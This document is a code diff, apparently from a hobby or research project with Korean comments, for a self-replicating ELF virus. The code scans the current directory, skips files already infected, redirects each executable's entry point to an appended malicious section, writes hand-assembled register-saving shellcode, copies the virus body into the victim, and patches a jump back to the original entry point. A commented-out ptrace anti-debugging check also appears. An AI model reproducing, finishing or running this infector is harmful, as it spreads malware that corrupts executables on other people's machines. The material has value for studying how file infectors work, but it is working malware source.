@@ -41,12 +41,9 @@ void listdir(const char *dirname,long long int startrip);
 void change_entrypoint(const char* ,long long int startrip);
 static inline long long int hereis();
 
+// 레지스터 컨텍스트를저장 
 int main(int argc, char* argv[])
 {
-	/*
-	if(my_ptraceme(0,0,0,0)!=0) while(1);
-		
-	*/
 	
 	int startrip;
 	
@@ -60,8 +57,20 @@ int main(int argc, char* argv[])
 	// printf("main RIP is : 0x%x\n",startrip);
 	
 	
+	/*
+	if(my_ptraceme(0,0,0,0)!=0) while(1);
+	*/
 	char dot[2]={'.',0};
     listdir(dot,startrip);
+	
+	// dummy instruction space for jmp instruction patch!!!
+	startrip = startrip + 1;
+	startrip = startrip - 1;
+	startrip = startrip + 1;
+	startrip = startrip - 1;
+	startrip = startrip + 1;
+	startrip = startrip - 1;
+	
 }
 
 
@@ -261,6 +270,8 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	}
 	if(is_infected_already) return 0;
 	
+
+	
 	
 	/*---------------------------------------------------------------------------*/
 	// Section header for malicious section. 
@@ -272,7 +283,7 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	
 	oep = ehdr.e_entry;
 	ehdr.e_entry = shellcodeloc;
-	// printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
+	//printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
 	my_lseek(fd, 0, SEEK_SET);
 	my_write(fd, &ehdr, sizeof(ehdr));
 	
@@ -280,6 +291,35 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	/*---------------------------------------------------------------------------*/
 	// Malicious section 
 	
+	
+	
+	
+	
+	/* ------------ main 앞에 레지스터 컨텍스트 저장하는 루틴을 추가 ------------ */
+	my_lseek(fd, 0, SEEK_END);
+	my_memset(shellcode,'\x90',0x1000);
+	
+	// rax~rdp 를 스택에 저장하고 esp포인터를 r15(virus루틴에서 사용하지 않는 레지스터)에 백업해둔다
+	/*
+	   50	push   %rax
+       53	push   %rbx
+       51	push   %rcx
+       52	push   %rdx
+       57	push   %rdi
+       55	push   %rbp
+       49 89 e7	mov    %rsp,%r15
+	*/
+	shellcode[0] = '\x50';
+	shellcode[1] = '\x53';
+	shellcode[2] = '\x51';
+	shellcode[3] = '\x52';
+	shellcode[4] = '\x57';
+	shellcode[5] = '\x55';
+	shellcode[6] = '\x49';
+	shellcode[7] = '\x89';
+	shellcode[8] = '\xe7';
+	
+	my_write(fd,shellcode,10);
 	
 	/*
 	  We use $RDI register to get relocation information. 
@@ -293,63 +333,108 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	  - If not :  
 	  *RDI  0x7ffff7ffe168 <— 0x0
 	*/
-	
-	
+		
 	
 	/* -----------Save original entry point-------------*/
-	my_memset(shellcode,'\x90',0x1000);
-	/* 50	push   %rax    (원본rax저장. rax 가 init의 리턴값을지정해주나봄. 그래서망가지면안됨.) */
-	shellcode[0] = 0x50;
-	
-	/* 48 b8 [OEP]	movabs rax,0x4141414141414141 */
-	shellcode[1] = 0x48;
-	shellcode[2] = 0xb8;
-	my_memcpy(&shellcode[3], &oep, sizeof(ehdr.e_entry));
-	
-	/* 48 03 07	add    rax,QWORD PTR [rdi]*/
-	shellcode[11] = 0x48;
-	shellcode[12] = 0x03;
-	shellcode[13] = 0x07;
-	
-	/* 50   push   %rax */
-	shellcode[14] = 0x50;  // 오리지널 엔트리 포인트를 동적으로 계산해서 쉘코드에 저장
-	
-	my_lseek(fd,0,SEEK_END); 
-	my_write(fd,shellcode,20);
+	// 이부분 없애버렸음. leave-ret 인지 ret 인지 모르는상황이기 때문에..
+	// 리턴주소는 main + ??? 에 jmp OEP 로 런타임패치하기로 하자.
 	/*--------------------------------------------------*/
 	
+
 	
-	
-	
-	
-	/* --------write whole program until end -----------*/
-	// lseek 은 안해도되고
+	/* ---------- write ls [main()~~~hereis()] ---------*/
+	my_lseek(fd, 0, SEEK_END);
 	endrip = hereis() + 10;
-	my_write(fd, startrip, endrip - startrip); // TODO : printf 없애야겠다
+	my_write(fd, startrip, endrip - startrip); 
 	/*--------------------------------------------------*/
 	
 	
 	
-	
-	
-	
-	/* --------- Go to Original Entry Point!------------*/
+	/* ------------- main 의 리턴주소를 런타임에 패치 ------------*/
 	my_memset(shellcode,'\x90',0x1000);
 	
-	// 41 5e	pop    %r14 리턴주소꺼내기
-	shellcode[0] = '\x41'; // 
-	shellcode[1] = '\x5e';
-	// 58	pop    %rax  rax꺼내기
-	shellcode[2] = '\x58';
-	// 41 ff e6	jmpq   *%r14
-	shellcode[3] = '\x41';
-	shellcode[4] = '\xff';
-	shellcode[5] = '\xe6';
+	// OEP로 뛰기위한 레지스터 컨텍스트 복원
+	/*   
+       4c 89 fc	mov    %r15,%rsp
+       5d	pop    %rbp
+       5f	pop    %rdi
+       5a	pop    %rdx
+       59	pop    %rcx
+       5b	pop    %rbx
+       58	pop    %rax
+	*/
+	shellcode[0] = '\x4c';
+	shellcode[1] = '\x89';
+	shellcode[2] = '\xfc';
+	shellcode[3] = '\x5d';
+	shellcode[4] = '\x5f';
+	shellcode[5] = '\x5a';
+	shellcode[6] = '\x59';
+	shellcode[7] = '\x5b';
+	shellcode[8] = '\x58';
 	
-	// 파일의 끝
-	my_lseek(fd,0,SEEK_END);  
-	my_write(fd,shellcode,0x10);
-	/* ----------------------------------------------- */	
+	
+	// OEP로 점프
+	/*  
+	     48 b8 41 41 41 41 41 41 41 41	movabs $0x4141414141414141,%rax  
+	     ff e0	jmpq   *%rax   
+	*/
+	shellcode[9] = '\x48';
+	shellcode[10] = '\xb8';
+	my_memcpy(&shellcode[11], &oep, sizeof(ehdr.e_entry));	
+	shellcode[19] = '\xff';
+	shellcode[20] = '\xe0';
+	
+	
+	/*
+	메인전 컨텍스트저장
+	50	push   %rax
+    53	push   %rbx
+    51	push   %rcx
+    52	push   %rdx
+    57	push   %rdi
+    55	push   %rbp
+    49 89 e7	mov    %rsp,%r15
+	90
+	
+	
+	메인은 이렇게 생겼음
+	00000000004004d6 <main>:
+	4004d6:	55                   	push   %rbp
+	4004d7:	48 89 e5             	mov    %rsp,%rbp
+	4004da:	48 83 ec 20          	sub    $0x20,%rsp
+	4004de:	89 7d ec             	mov    %edi,-0x14(%rbp)
+	4004e1:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
+	4004e5:	48 8d 05 00 00 00 00 	lea    0x0(%rip),%rax        # 4004ec <main+0x16>
+	4004ec:	8d 00                	lea    (%rax),%eax
+	4004ee:	89 45 fc             	mov    %eax,-0x4(%rbp)
+	4004f1:	83 6d fc 16          	subl   $0x16,-0x4(%rbp)
+	4004f5:	c6 45 f0 2e          	movb   $0x2e,-0x10(%rbp)
+	4004f9:	c6 45 f1 00          	movb   $0x0,-0xf(%rbp)
+	4004fd:	8b 45 fc             	mov    -0x4(%rbp),%eax
+	400500:	48 63 d0             	movslq %eax,%rdx
+	400503:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
+	400507:	48 89 d6             	mov    %rdx,%rsi
+	40050a:	48 89 c7             	mov    %rax,%rdi
+	40050d:	e8 ba 02 00 00       	callq  4007cc <listdir>
+	
+	// 여기서부터 패치 시작
+	400512:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+	400516:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
+	40051a:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+	40051e:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
+	400522:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+	400526:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
+	40052a:	b8 00 00 00 00       	mov    $0x0,%eax
+	40052f:	c9                   	leaveq 
+	400530:	c3                   	retq   
+	*/
+	// virtual address가 아니라 실제로 shellcodeloc 이 파일시작으로부터 위치한거리. 따라서 base주소를 빼줘야 함. base는 어딨지? --> filesize!!
+	my_lseek(fd, filesize + 10 + 60, SEEK_SET); // 아아.. 파일사이즈(ls의끝)이 main이아니라 push..push... 이므로 이 길이도 계산해줘야함.
+	my_write(fd, shellcode, 30);
+	
+	/* ------------------------------------------------ */
+
 
 }
 static inline long long int hereis(){ 
